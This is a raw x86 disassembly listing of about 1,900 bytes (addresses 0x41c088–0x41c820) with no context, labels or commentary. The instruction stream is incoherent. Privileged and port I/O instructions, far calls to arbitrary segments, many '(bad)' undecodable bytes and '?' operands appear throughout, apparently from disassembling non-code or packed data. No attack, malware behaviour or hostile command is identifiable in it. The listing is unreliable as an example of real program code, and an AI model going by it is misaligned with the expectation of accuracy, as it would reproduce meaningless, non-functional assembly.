  41c088:	mov    ah,0xfd
  41c08a:	sbb    DWORD PTR [ebp-0x6a8687ec],ebx
  41c090:	loope  0x41c0e5
  41c092:	out    dx,al
  41c093:	ins    BYTE PTR es:[edi],dx
  41c094:	push   ds
  41c095:	jbe    0x41c027
  41c097:	adc    al,BYTE PTR [edi-0x5f]
  41c09a:	mov    ss,edi
  41c09c:	call   0x7ab:0x16709be6
  41c0a3:	or     bh,BYTE PTR [edx+0xcb7a4fa]
  41c0a9:	xor    ebx,DWORD PTR [ebx+0x1fb86e9e]
  41c0af:	loopne 0x41c0b7
  41c0b1:	mov    cx,0xef63
  41c0b5:	xchg   al,cl
  41c0b7:	cmp    eax,0xc1aa8e9b
  41c0bc:	leave  
  41c0bd:	mov    bl,0x66
  41c0bf:	hlt    
  41c0c0:	mul    DWORD PTR [ebx+0x45]
  41c0c3:	mov    bl,0xf9
  41c0c5:	push   ss
  41c0c6:	addr16 add eax,0xd4f10965
  41c0cc:	sub    bl,dh
  41c0ce:	and    BYTE PTR [edi+ebp*8],0xdd
  41c0d2:	add    ebp,edx
  41c0d4:	xor    dl,BYTE PTR [eax-0x4ccb4b72]
  41c0da:	mov    al,BYTE PTR [esi]
  41c0dc:	or     bl,BYTE PTR ds:0x6c2dd0a1
  41c0e2:	mov    eax,0x39dc3e9a
  41c0e7:	sub    esi,DWORD PTR [ebx+esi*4-0x215dbe5b]
  41c0ee:	aam    0x1c
  41c0f0:	fcomi  st,st(1)
  41c0f2:	lahf   
  41c0f3:	jp     0x41c112
  41c0f5:	mov    al,ds:0xbd986dd7
  41c0fa:	push   esi
  41c0fb:	inc    esi
  41c0fc:	push   es
  41c0fd:	bound  ecx,QWORD PTR [ebp+0x28]
  41c100:	push   es
  41c101:	mov    ah,BYTE PTR [edi+0x79]
  41c104:	sbb    ah,BYTE PTR [ebx]
  41c106:	jle    0x41c123
  41c108:	inc    esi
  41c109:	pop    esi
  41c10a:	or     bh,BYTE PTR [eax-0x6d0942c8]
  41c110:	push   edx
  41c111:	in     eax,dx
  41c112:	aad    0x8
  41c114:	sahf   
  41c115:	push   eax
  41c116:	rol    BYTE PTR [ebx],1
  41c118:	test   eax,0x6b530b18
  41c11d:	popa   
  41c11e:	imul   esi,DWORD PTR [ebp-0x5c],0xba067e6b
  41c125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c126:	sub    bl,cl
  41c128:	(bad)  
  41c129:	jno    0x41c144
  41c12b:	int    0xed
  41c12d:	mov    ch,0xa0
  41c12f:	mov    edi,0xf5073ae6
  41c134:	mov    esp,cs
  41c136:	dec    edx
  41c137:	scas   al,BYTE PTR es:[edi]
  41c138:	jb     0x41c182
  41c13a:	xchg   ebp,eax
  41c13b:	arpl   WORD PTR [edi],ax
  41c13d:	loopne 0x41c0c9
  41c13f:	repz xor al,0xa1
  41c142:	rol    DWORD PTR [esi+0x405f6bb0],0x93
  41c149:	ss push ebx
  41c14b:	dec    ecx
  41c14c:	jp     0x41c11d
  41c14e:	pop    esi
  41c14f:	mov    DWORD PTR [edx+ebx*8],ebp
  41c152:	sti    
  41c153:	push   cs
  41c154:	int    0xa3
  41c156:	cmp    eax,0xb4f6dfff
  41c15b:	sub    eax,DWORD PTR [eax-0x7f]
  41c15e:	push   es
  41c15f:	pop    es
  41c160:	pop    edx
  41c161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c162:	pop    edx
  41c163:	jno    0x41c17e
  41c165:	mov    bl,0xa3
  41c167:	jg     0x41c178
  41c169:	cmp    bh,BYTE PTR [edi]
  41c16b:	pushf  
  41c16c:	xor    bl,ah
  41c16e:	xchg   esp,eax
  41c16f:	xor    al,cl
  41c171:	jp     0x41c114
  41c173:	mov    ecx,0x313f073f
  41c178:	hlt    
  41c179:	leave  
  41c17a:	sbb    al,0x9e
  41c17c:	xor    al,0x12
  41c17e:	in     eax,dx
  41c17f:	or     ah,BYTE PTR [edi+0x6f835a4a]
  41c185:	sahf   
  41c186:	pop    esp
  41c187:	push   ecx
  41c188:	xor    edi,edx
  41c18a:	getsec 
  41c18c:	push   esp
  41c18d:	jle    0x41c171
  41c18f:	fs out 0xb2,eax
  41c192:	and    dh,ch
  41c194:	rcl    DWORD PTR [edx-0x71cca6bc],1
  41c19a:	daa    
  41c19b:	loope  0x41c161
  41c19d:	call   0x2617:0x57be86b9
  41c1a4:	rcr    DWORD PTR [edi],1
  41c1a6:	sub    eax,DWORD PTR [esp+eiz*4]
  41c1a9:	cmc    
  41c1aa:	mov    bh,BYTE PTR [eax+0x1e]
  41c1ad:	mulps  xmm4,XMMWORD PTR [ebx+0x6c48713f]
  41c1b4:	inc    eax
  41c1b5:	cmp    ch,bl
  41c1b7:	cli    
  41c1b8:	pop    edx
  41c1b9:	cmp    ebx,ecx
  41c1bb:	pop    eax
  41c1bc:	outs   dx,BYTE PTR ds:[esi]
  41c1bd:	mov    edi,0x1da82f4a
  41c1c2:	mov    ah,0xd8
  41c1c4:	mov    ds:0xf9950d90,al
  41c1c9:	push   ebp
  41c1ca:	lea    ebp,[edi]
  41c1cc:	pop    ecx
  41c1cd:	push   ebp
  41c1ce:	(bad)  
  41c1cf:	sbb    eax,0x2a2c503b
  41c1d4:	fsub   st,st(4)
  41c1d6:	cli    
  41c1d7:	sub    DWORD PTR [edx+0x2ddc38c6],ebp
  41c1dd:	mov    ah,0x66
  41c1df:	sub    eax,0x6078d6e5
  41c1e4:	loope  0x41c207
  41c1e6:	mov    ecx,0xceb439ca
  41c1eb:	jecxz  0x41c23a
  41c1ed:	and    DWORD PTR [eax+0x52],esi
  41c1f0:	fild   DWORD PTR [edi+eiz*2]
  41c1f3:	test   eax,0xc35514a5
  41c1f9:	test   eax,0x72f0a527
  41c1fe:	xor    edi,edx
  41c200:	jg     0x41c1e0
  41c202:	imul   ebp,ecx,0x44f2d7b2
  41c208:	clc    
  41c209:	fistp  WORD PTR [edx+0x47]
  41c20c:	cmp    cl,BYTE PTR [ebp-0x36]
  41c20f:	out    0x22,eax
  41c211:	int    0xa1
  41c213:	dec    edi
  41c214:	or     DWORD PTR [ecx],0xeca54e8f
  41c21a:	push   eax
  41c21b:	and    ebp,eax
  41c21d:	mov    esi,0x866bf655
  41c222:	jmp    0x41c262
  41c224:	dec    esp
  41c225:	and    ecx,edi
  41c227:	pop    ebx
  41c228:	adc    al,0x39
  41c22a:	cmp    DWORD PTR [ebp+0x63],eax
  41c22d:	pop    ebp
  41c22e:	jle    0x41c284
  41c230:	cmp    DWORD PTR [edi-0x78],ebp
  41c233:	pop    ecx
  41c234:	mov    esi,esp
  41c236:	arpl   bp,di
  41c238:	gs inc ecx
  41c23a:	sbb    eax,0xe7b33c7d
  41c23f:	inc    ebp
  41c240:	dec    eax
  41c241:	fwait
  41c242:	stc    
  41c243:	push   es
  41c244:	mov    ebp,0xc9697e5
  41c249:	(bad)  
  41c24a:	data16 stc 
  41c24c:	jl     0x41c2af
  41c24e:	xor    cl,ch
  41c250:	ficomp WORD PTR [edi]
  41c252:	sub    DWORD PTR cs:[ebx-0x3a4f32c3],ebx
  41c259:	test   eax,0x8c5fec55
  41c25e:	mov    dh,bh
  41c260:	bound  ebp,QWORD PTR [eax]
  41c262:	scas   eax,DWORD PTR es:[edi]
  41c263:	push   ss
  41c264:	xchg   DWORD PTR [ebx+0x16],edi
  41c267:	jbe    0x41c2e6
  41c269:	jle    0x41c25b
  41c26b:	pop    edx
  41c26c:	repnz stos DWORD PTR es:[edi],eax
  41c26e:	mov    ds,WORD PTR [edx+0xea34ba4]
  41c274:	mov    ch,0x27
  41c276:	adc    ah,BYTE PTR [ebp+0x11aef221]
  41c27c:	push   ecx
  41c27d:	scas   eax,DWORD PTR es:[edi]
  41c27e:	out    dx,eax
  41c27f:	xchg   esi,eax
  41c280:	dec    ebx
  41c281:	inc    esp
  41c282:	repz jecxz 0x41c294
  41c285:	mov    cl,0x36
  41c287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c288:	xor    eax,0xd0341467
  41c28d:	into   
  41c28e:	dec    edi
  41c28f:	in     eax,0x71
  41c291:	and    al,0xbf
  41c293:	(bad)  
  41c294:	loopne 0x41c24a
  41c296:	jmp    0x3c8d:0xa1d66537
  41c29d:	inc    esi
  41c29e:	jmp    0x41c312
  41c2a0:	cld    
  41c2a1:	or     BYTE PTR [edi-0x8a4d1dd],bl
  41c2a7:	(bad)  [edx]
  41c2a9:	xlat   BYTE PTR ds:[ebx]
  41c2aa:	clc    
  41c2ab:	xor    al,0xb4
  41c2ad:	jns    0x41c2ff
  41c2af:	xor    eax,0x79b0d4b7
  41c2b4:	push   ebp
  41c2b5:	push   ecx
  41c2b6:	cmp    bl,BYTE PTR [esi+eiz*8]
  41c2b9:	dec    ebp
  41c2ba:	int    0x53
  41c2bc:	mov    eax,0x84995fcb
  41c2c1:	fcom   DWORD PTR [edi+0x72]
  41c2c4:	inc    edx
  41c2c5:	inc    ebp
  41c2c6:	(bad)
  41c2ca:	(bad)  
  41c2cb:	scas   eax,DWORD PTR es:[edi]
  41c2cc:	scas   al,BYTE PTR es:[edi]
  41c2cd:	adc    ah,al
  41c2cf:	add    eax,0x9af02597
  41c2d4:	sbb    BYTE PTR [edi-0xf07f983],bh
  41c2da:	ss push es
  41c2dc:	xchg   edi,eax
  41c2dd:	cmp    al,0xb3
  41c2df:	pop    ss
  41c2e0:	jge    0x41c2e5
  41c2e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2e3:	cmp    eax,0x43887488
  41c2e8:	sub    ch,BYTE PTR [ebp-0x3c]
  41c2eb:	cs adc al,0xb0
  41c2ee:	jmp    esi
  41c2f0:	mov    bl,0xb2
  41c2f2:	pop    eax
  41c2f3:	std    
  41c2f4:	mov    WORD PTR [ebx+eax*1+0x39],?
  41c2f8:	xchg   DWORD PTR [eax-0x6e],esi
  41c2fb:	jg     0x41c2c1
  41c2fd:	push   ss
  41c2fe:	add    DWORD PTR [ecx+0x2a],esi
  41c301:	dec    ecx
  41c302:	(bad)  
  41c303:	out    0x52,eax
  41c305:	dec    ebx
  41c306:	pop    ds
  41c307:	imul   ebp
  41c309:	scas   eax,DWORD PTR es:[edi]
  41c30a:	xor    bl,BYTE PTR [edx-0x2949a694]
  41c310:	sbb    BYTE PTR [edi-0x35],bl
  41c313:	push   edi
  41c314:	jne    0x41c318
  41c316:	test   al,0xcf
  41c318:	mov    eax,0x53bcf3c5
  41c31d:	sahf   
  41c31e:	aaa    
  41c31f:	js     0x41c335
  41c321:	mov    al,bh
  41c323:	into   
  41c324:	into   
  41c325:	push   es
  41c326:	fldcw  WORD PTR [edi+ecx*8-0x46]
  41c32a:	outs   dx,BYTE PTR ds:[esi]
  41c32b:	aas    
  41c32c:	add    eax,DWORD PTR [esi-0x17]
  41c32f:	ja     0x41c30c
  41c331:	cmp    DWORD PTR [esi+0x1],0xe8eade97
  41c338:	ins    DWORD PTR es:[edi],dx
  41c339:	daa    
  41c33a:	ss mov esi,0x1202c822
  41c340:	jae    0x41c310
  41c342:	retf   0xe36
  41c345:	cmp    eax,0x92b5397d
  41c34a:	jbe    0x41c38a
  41c34c:	stos   DWORD PTR es:[edi],eax
  41c34d:	mov    esp,0xf4ae1ba5
  41c352:	push   esp
  41c353:	enter  0x826c,0xdc
  41c357:	in     eax,0x6b
  41c359:	lahf   
  41c35a:	sar    DWORD PTR [ebx+0x74],cl
  41c35d:	cwde   
  41c35e:	jl     0x41c329
  41c360:	adc    BYTE PTR [ebp-0x189a18c1],bl
  41c366:	fs xchg edi,eax
  41c368:	in     al,0x16
  41c36a:	lea    ecx,[edx]
  41c36c:	sub    al,0x1a
  41c36e:	daa    
  41c36f:	xbegin 0xd83cab27
  41c375:	push   ebp
  41c376:	lahf   
  41c377:	add    eax,0x72b604d
  41c37c:	into   
  41c37d:	adc    ah,BYTE PTR [ecx]
  41c37f:	pop    esp
  41c380:	int    0x8f
  41c382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c383:	iret   
  41c384:	iret   
  41c385:	cmc    
  41c386:	sub    DWORD PTR [edi],edx
  41c388:	cmp    eax,0x5e352151
  41c38d:	mov    al,0xea
  41c38f:	mov    bl,0x7a
  41c391:	fcomp  DWORD PTR [ecx+0x4b]
  41c394:	fucomp st(4)
  41c396:	xchg   esp,eax
  41c397:	or     DWORD PTR [ecx-0x77a8b28f],edx
  41c39d:	scas   eax,DWORD PTR es:[edi]
  41c39e:	in     al,dx
  41c39f:	stc    
  41c3a0:	mov    eax,0x2342802e
  41c3a5:	push   ss
  41c3a6:	jg     0x41c36e
  41c3a8:	jbe    0x41c3b9
  41c3aa:	mov    al,0x19
  41c3ac:	sahf   
  41c3ad:	xlat   BYTE PTR ds:[ebx]
  41c3ae:	ins    DWORD PTR es:[edi],dx
  41c3af:	cmovno ebx,eax
  41c3b2:	hlt    
  41c3b3:	inc    edx
  41c3b4:	xor    ah,ch
  41c3b6:	into   
  41c3b7:	jne    0x41c348
  41c3b9:	into   
  41c3ba:	ins    BYTE PTR es:[edi],dx
  41c3bb:	xchg   ecx,eax
  41c3bc:	fisub  DWORD PTR [esi-0x43]
  41c3bf:	mov    ds:0x6259dc5b,eax
  41c3c4:	jns    0x41c3d0
  41c3c6:	in     al,0x31
  41c3c8:	cdq    
  41c3c9:	pop    esi
  41c3ca:	repz data16 or ah,cl
  41c3ce:	xchg   ebx,eax
  41c3cf:	sbb    eax,0xab0f251b
  41c3d4:	lods   eax,DWORD PTR ds:[esi]
  41c3d5:	jno    0x41c425
  41c3d7:	loopne 0x41c35c
  41c3d9:	adc    ecx,ebx
  41c3db:	icebp  
  41c3dc:	and    DWORD PTR [edi],0xff335081
  41c3e2:	cdq    
  41c3e3:	push   edx
  41c3e4:	xor    dh,bh
  41c3e6:	je     0x41c375
  41c3e8:	jns    0x41c41f
  41c3ea:	in     eax,0x85
  41c3ec:	mov    ?,edx
  41c3ee:	aas    
  41c3ef:	data16 and al,0x83
  41c3f2:	daa    
  41c3f3:	fdiv   DWORD PTR [ebx+0x65]
  41c3f6:	test   eax,0x97491e03
  41c3fb:	add    cl,BYTE PTR [ebx-0x11]
  41c3fe:	sbb    bl,al
  41c400:	jne    0x41c458
  41c402:	cli    
  41c403:	mov    al,ds:0x251e2f8f
  41c408:	push   esi
  41c409:	or     BYTE PTR [edi],dh
  41c40b:	test   DWORD PTR [eax-0x4a],0x7330f93b
  41c412:	popa   
  41c413:	or     al,0x9d
  41c415:	aad    0xa5
  41c417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c418:	push   ebx
  41c419:	cli    
  41c41a:	dec    esp
  41c41b:	dec    ecx
  41c41c:	pop    ds
  41c41d:	ss test dl,0x71
  41c421:	sub    dh,bh
  41c423:	pop    edi
  41c424:	fld    QWORD PTR [edx-0x53]
  41c427:	mov    ecx,0xaf90a8e7
  41c42c:	inc    ecx
  41c42d:	shl    DWORD PTR [edx+ecx*2+0x59e9207c],0x4c
  41c435:	cli    
  41c436:	(bad)  
  41c437:	mov    ecx,0x3db887a7
  41c43c:	xor    BYTE PTR [edx-0x39fb46a5],ah
  41c442:	pusha  
  41c443:	mov    ebp,DWORD PTR [eax+0x24e43e77]
  41c449:	out    0xb3,al
  41c44b:	adc    edi,DWORD PTR [ecx]
  41c44d:	jecxz  0x41c47b
  41c44f:	jg     0x41c3d5
  41c451:	add    BYTE PTR [ebx],dl
  41c453:	sbb    eax,0x3ed76997
  41c458:	jno    0x41c477
  41c45a:	mov    ebp,0x66e066bb
  41c45f:	jp     0x41c442
  41c461:	jmp    0x2fc0bceb
  41c466:	pop    esp
  41c467:	adc    al,0x4e
  41c469:	addr16 mov al,0x28
  41c46c:	shl    BYTE PTR [ebx-0x20],cl
  41c46f:	cwde   
  41c470:	imul   edx,ebx,0x4a
  41c473:	mov    ebx,0x5b679447
  41c478:	inc    ebx
  41c479:	gs push ss
  41c47b:	sbb    BYTE PTR [edx-0x232e1407],ch
  41c481:	stos   BYTE PTR es:[edi],al
  41c482:	fisttp WORD PTR [eax+0x20407585]
  41c488:	jl     0x41c477
  41c48a:	cld    
  41c48b:	pop    esp
  41c48c:	sub    al,dh
  41c48e:	or     DWORD PTR [eax-0x13],edx
  41c491:	imul   DWORD PTR [edx+0x7c82c42c]
  41c497:	xchg   ebx,eax
  41c498:	lds    edx,FWORD PTR [ebx]
  41c49a:	mov    ch,0xbc
  41c49c:	mov    esi,0x352edcf8
  41c4a1:	push   es
  41c4a2:	call   0x188d:0x2cd30d2
  41c4a9:	ror    ch,0xd6
  41c4ac:	xchg   edx,eax
  41c4ad:	dec    eax
  41c4ae:	ins    BYTE PTR es:[edi],dx
  41c4af:	inc    ebx
  41c4b0:	mov    cl,0xed
  41c4b2:	and    al,0x6f
  41c4b4:	xor    BYTE PTR [esi],ah
  41c4b6:	(bad)  
  41c4b7:	fisubr WORD PTR [ecx+ecx*8]
  41c4ba:	and    dh,BYTE PTR [eax+0x612d163b]
  41c4c0:	pusha  
  41c4c1:	xchg   ebp,eax
  41c4c2:	pusha  
  41c4c3:	cdq    
  41c4c4:	in     al,dx
  41c4c5:	adc    ecx,DWORD PTR [ebx+0x639073ae]
  41c4cb:	pop    ecx
  41c4cc:	outs   dx,BYTE PTR ds:[esi]
  41c4cd:	mov    ecx,0x321c0f9f
  41c4d2:	adc    ch,BYTE PTR [ecx+ebp*1+0x3a]
  41c4d6:	dec    ebp
  41c4d7:	mov    ds:0x8343432e,eax
  41c4dc:	sub    esp,DWORD PTR ds:[edi-0xeb7350b]
  41c4e3:	and    BYTE PTR fs:[ecx],dl
  41c4e6:	cli    
  41c4e7:	sbb    bh,ah
  41c4e9:	in     al,0x2b
  41c4eb:	lahf   
  41c4ec:	push   cs
  41c4ed:	fsubr  st,st(2)
  41c4ef:	xor    BYTE PTR [edx],ch
  41c4f1:	fsubr  st,st(7)
  41c4f3:	and    eax,0xb66ba945
  41c4f8:	mov    esp,DWORD PTR [ebx+0x239d9d08]
  41c4fe:	xchg   dl,cl
  41c500:	lds    ebx,FWORD PTR [eax]
  41c502:	inc    eax
  41c503:	out    0xe,al
  41c505:	(bad)  
  41c506:	and    dh,BYTE PTR [edx]
  41c508:	scas   al,BYTE PTR es:[edi]
  41c509:	pop    esp
  41c50a:	xchg   ebx,eax
  41c50b:	test   BYTE PTR [eax+0x49],bl
  41c50e:	add    al,0x53
  41c510:	shl    BYTE PTR [edi+0x2e35445d],0x64
  41c517:	sub    bh,BYTE PTR [edx-0x1db9168c]
  41c51d:	jmp    0xe77:0x45ef802c
  41c524:	push   ds
  41c525:	or     eax,esi
  41c527:	mov    cs,WORD PTR [ebx-0x114b5f04]
  41c52d:	pop    ebp
  41c52e:	outs   dx,BYTE PTR ds:[esi]
  41c52f:	sbb    al,0xea
  41c531:	cld    
  41c532:	repnz mov esi,0x8e70848e
  41c538:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c539:	mov    al,0x84
  41c53b:	cmp    al,0x47
  41c53d:	cmp    DWORD PTR [eax+0x9],esp
  41c540:	jno    0x41c548
  41c542:	loope  0x41c54d
  41c544:	inc    ebx
  41c545:	das    
  41c546:	or     al,BYTE PTR [eax]
  41c548:	push   es
  41c549:	mov    al,0x88
  41c54b:	sub    al,0x66
  41c54d:	mov    ebp,0x7cd118b8
  41c552:	ror    esi,cl
  41c554:	mov    eax,ds:0xc2043066
  41c559:	inc    esi
  41c55a:	pop    es
  41c55b:	or     ebp,DWORD PTR [eax-0x6645bf93]
  41c561:	aas    
  41c562:	mov    dh,0x15
  41c564:	clc    
  41c565:	mov    edx,0xd6ce4305
  41c56a:	push   esi
  41c56b:	repnz icebp 
  41c56d:	mov    al,0x1d
  41c56f:	sub    esp,DWORD PTR [edi+0x7f4576b1]
  41c575:	mov    ecx,0x2c5c86f3
  41c57a:	xor    dh,BYTE PTR [ebx]
  41c57c:	push   ss
  41c57d:	popf   
  41c57e:	or     al,0x72
  41c580:	in     al,dx
  41c581:	mov    ebx,0xffc0b3ca
  41c586:	sti    
  41c587:	lea    edi,[ebx-0xaef460a]
  41c58d:	mov    dl,0x47
  41c58f:	das    
  41c590:	or     ecx,ecx
  41c592:	xor    BYTE PTR [ebx-0x51],dl
  41c595:	cli    
  41c596:	xor    ebp,esi
  41c598:	fisubr WORD PTR [edx]
  41c59a:	cmp    al,0x5f
  41c59c:	iret   
  41c59d:	mov    esi,0x87ffd967
  41c5a2:	mov    dh,0x68
  41c5a4:	mov    al,ds:0x7a727023
  41c5a9:	(bad)  
  41c5aa:	adc    ebx,DWORD PTR [eax+0x70]
  41c5ad:	ror    bh,1
  41c5af:	popf   
  41c5b0:	and    BYTE PTR [edx+0x53995a7],ch
  41c5b6:	aam    0x9e
  41c5b8:	pop    ss
  41c5b9:	push   ebx
  41c5ba:	popa   
  41c5bb:	leave  
  41c5bc:	mov    bh,0x2e
  41c5be:	and    BYTE PTR [ebx-0x6d32c998],ch
  41c5c4:	mov    ebp,0x71082cdb
  41c5c9:	stos   DWORD PTR es:[edi],eax
  41c5ca:	cmp    eax,0x502c5cad
  41c5cf:	dec    ebx
  41c5d0:	xor    al,0x82
  41c5d2:	mov    ebx,0x1d0d914e
  41c5d7:	jb     0x41c624
  41c5d9:	daa    
  41c5da:	loop   0x41c61a
  41c5dc:	pop    eax
  41c5dd:	xor    BYTE PTR [ebx+edx*2-0x6],al
  41c5e1:	mov    BYTE PTR [ebx+0x55],dl
  41c5e4:	mov    eax,ds:0x8fc05703
  41c5e9:	sbb    bh,BYTE PTR [ecx-0x3e]
  41c5ec:	pop    edi
  41c5ed:	mov    ah,0xe0
  41c5ef:	and    ah,cl
  41c5f1:	or     al,0x7
  41c5f3:	icebp  
  41c5f4:	bound  ebp,QWORD PTR [edi-0x9d66b7e]
  41c5fa:	pop    edx
  41c5fb:	inc    ebx
  41c5fc:	sub    eax,0x7a20bd81
  41c601:	mov    esp,0x4fd37c6c
  41c606:	in     eax,dx
  41c607:	push   esi
  41c608:	jmp    0x41c63d
  41c60a:	jl     0x41c616
  41c60c:	mov    ?,edi
  41c60e:	jge    0x41c67f
  41c610:	push   ebp
  41c611:	adc    eax,0xcf60c4ba
  41c616:	mov    esi,0xf4816583
  41c61b:	sub    DWORD PTR [eax+eiz*2+0x44],0x37
  41c620:	push   0x3b57f49a
  41c625:	push   edx
  41c626:	jecxz  0x41c5de
  41c628:	inc    ebp
  41c629:	cs dec edi
  41c62b:	jns    0x41c5bb
  41c62d:	or     al,0x4d
  41c62f:	repnz inc esi
  41c631:	outs   dx,BYTE PTR ds:[esi]
  41c632:	fldenv [edi]
  41c634:	enter  0xd93d,0x93
  41c638:	sub    esi,DWORD PTR [edi+0x6]
  41c63b:	mov    esi,DWORD PTR [edi]
  41c63d:	or     al,0xc9
  41c63f:	nop
  41c640:	scas   eax,DWORD PTR es:[edi]
  41c641:	mov    al,ds:0xf4125ef3
  41c646:	dec    ecx
  41c647:	cmp    bl,BYTE PTR ds:0x21fdb068
  41c64d:	xor    edi,ebp
  41c64f:	inc    edi
  41c650:	xchg   esi,ebx
  41c652:	call   0xa01b59b5
  41c657:	fcom   QWORD PTR [esi+ecx*2-0x9]
  41c65b:	sahf   
  41c65c:	nop
  41c65d:	enter  0xd75e,0xe3
  41c661:	daa    
  41c662:	mov    ds:0x7be3bf54,al
  41c667:	in     eax,0x92
  41c669:	inc    edi
  41c66a:	xor    DWORD PTR [eax-0x70],edx
  41c66d:	sbb    ch,0x1b
  41c670:	test   cl,cl
  41c672:	fwait
  41c673:	mov    al,0xf5
  41c675:	ins    DWORD PTR es:[edi],dx
  41c676:	data16 fadd DWORD PTR [ebp-0x200817ed]
  41c67d:	arpl   ax,dx
  41c67f:	xchg   esi,eax
  41c680:	ficomp DWORD PTR [ecx-0x43f2631c]
  41c686:	xchg   esi,eax
  41c687:	mov    esi,0x7df9c001
  41c68c:	sbb    BYTE PTR [edi],0xfe
  41c68f:	cmc    
  41c690:	cmc    
  41c691:	mov    edi,0x437abf77
  41c696:	adc    eax,0x280de904
  41c69b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c69c:	sbb    cl,BYTE PTR [ebx+0x5e6436a4]
  41c6a2:	add    DWORD PTR [edx+0x4ecf7b80],eax
  41c6a8:	(bad)  
  41c6a9:	push   0x4efc10c5
  41c6ae:	xchg   ebx,eax
  41c6af:	dec    ebp
  41c6b0:	push   cs
  41c6b1:	adc    al,0x9b
  41c6b3:	fnstenv ds:0x8eed3822
  41c6b9:	jb     0x41c6d3
  41c6bb:	call   0x86d2:0xa1292bad
  41c6c2:	jle    0x41c65e
  41c6c4:	sbb    BYTE PTR [edx],cl
  41c6c6:	mov    ah,0x60
  41c6c8:	retf   
  41c6c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6ca:	add    eax,0x4ef84cce
  41c6cf:	mov    esp,0x7797f082
  41c6d4:	mov    esp,0xe7694f9e
  41c6d9:	(bad)  
  41c6da:	xchg   ebx,eax
  41c6db:	push   0x28
  41c6dd:	fidiv  DWORD PTR fs:[edi+0x74]
  41c6e1:	push   cs
  41c6e2:	or     ah,BYTE PTR [edx+0x51]
  41c6e5:	dec    ebp
  41c6e6:	fisub  WORD PTR [ebx-0x7dc19290]
  41c6ec:	std    
  41c6ed:	mov    esi,0x214b0687
  41c6f2:	jo     0x41c722
  41c6f4:	fcom   QWORD PTR [ebx+0x69f604e2]
  41c6fa:	ror    DWORD PTR [ebx],1
  41c6fc:	imul   eax,ecx,0x1b720267
  41c702:	clc    
  41c703:	and    eax,0x1959deeb
  41c708:	xchg   esi,eax
  41c709:	(bad)  
  41c70a:	jmp    0x56fa:0x95d892f1
  41c711:	fnstenv ds:0xfda75f70
  41c717:	fstp   TBYTE PTR [ecx]
  41c719:	(bad)  
  41c71a:	enter  0x15c3,0x35
  41c71e:	sbb    BYTE PTR ds:0x159efdc,bl
  41c724:	push   cs
  41c725:	pushf  
  41c726:	cmc    
  41c727:	rcr    DWORD PTR [edx-0x47],cl
  41c72a:	ss pop edx
  41c72c:	mov    BYTE PTR [edx-0x19c65a94],bl
  41c732:	sub    dl,BYTE PTR [edi]
  41c734:	push   0xffffff95
  41c736:	xchg   ecx,eax
  41c737:	and    ebx,DWORD PTR [esi]
  41c739:	das    
  41c73a:	mov    DWORD PTR [ecx+0x2],edx
  41c73d:	retf   0xdd08
  41c740:	ss mov esi,0x6c672a0
  41c746:	sub    eax,0x694931ac
  41c74b:	add    eax,0xf12d4e63
  41c750:	iret   
  41c751:	imul   eax,DWORD PTR [ebx+0x3df55df],0x60190c4c
  41c75b:	and    BYTE PTR [edi+0x40],ch
  41c75e:	cld    
  41c75f:	cmp    BYTE PTR [ebp+0x7a],0x6d
  41c763:	and    al,0xb9
  41c765:	cs clc 
  41c767:	lahf   
  41c768:	nop
  41c769:	je     0x41c733
  41c76b:	jecxz  0x41c6fb
  41c76d:	mov    ds:0x51eacf32,eax
  41c772:	dec    edx
  41c774:	data16 adc al,0x7a
  41c777:	hlt    
  41c778:	and    esp,ebp
  41c77a:	xor    dl,BYTE PTR [esi]
  41c77c:	mov    ds:0x418e1ac6,eax
  41c781:	(bad)  
  41c783:	pop    edx
  41c784:	aad    0x2b
  41c786:	mov    esp,0xcf65e3cc
  41c78b:	enter  0x9c9b,0xfd
  41c78f:	cmp    BYTE PTR [ebp-0x52d523c8],cl
  41c795:	dec    ecx
  41c796:	xor    DWORD PTR [ebx-0x30],ecx
  41c799:	dec    ecx
  41c79a:	add    cl,al
  41c79c:	xor    DWORD PTR [ebp-0x19],0x45e820d0
  41c7a3:	neg    BYTE PTR [esi+0x52]
  41c7a6:	repnz fistp DWORD PTR [edx]
  41c7a9:	mov    eax,ds:0x6e4fa7f8
  41c7ae:	pop    ecx
  41c7af:	adc    cl,BYTE PTR [eax]
  41c7b1:	jp     0x41c78b
  41c7b3:	sub    al,0x5b
  41c7b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7b6:	jle    0x41c7df
  41c7b8:	pop    ss
  41c7b9:	xor    BYTE PTR [esi+0x6e],dh
  41c7bc:	fild   QWORD PTR [ebp+0x2b]
  41c7bf:	jl     0x41c7ab
  41c7c1:	std    
  41c7c2:	test   al,0x87
  41c7c4:	push   edx
  41c7c5:	xchg   edi,eax
  41c7c6:	retf   0xcec7
  41c7c9:	mov    dh,0x4d
  41c7cb:	ror    DWORD PTR [edi+0x31],cl
  41c7ce:	in     eax,0x77
  41c7d0:	dec    edx
  41c7d1:	dec    ebx
  41c7d2:	inc    ecx
  41c7d3:	into   
  41c7d4:	shl    DWORD PTR [ebp+0x78ccf2db],cl
  41c7da:	xor    ebp,edi
  41c7dc:	pop    ebx
  41c7dd:	std    
  41c7de:	mov    esi,0xc262ec44
  41c7e3:	sbb    bl,ch
  41c7e5:	pop    esi
  41c7e6:	jecxz  0x41c846
  41c7e8:	sbb    cl,BYTE PTR [esi-0x627d1315]
  41c7ee:	adc    eax,0xc4d9450b
  41c7f3:	cdq    
  41c7f4:	sub    DWORD PTR [ebp+0x827f92a],esi
  41c7fa:	push   0xfffffff3
  41c7fc:	mov    ecx,0xb3b3588e
  41c801:	dec    BYTE PTR [edx+0x2b0d380d]
  41c807:	push   ds
  41c808:	das    
  41c809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c80a:	imul   edi,DWORD PTR [ecx+0x76a766ee],0x78
  41c811:	xchg   DWORD PTR [eax-0x3a],edx
  41c814:	ja     0x41c814
  41c816:	(bad)  
  41c818:	jno    0x41c833
  41c81a:	xchg   edx,eax
  41c81b:	out    0xe5,eax
  41c81d:	retf   0xbf40
  41c820:	push   edx
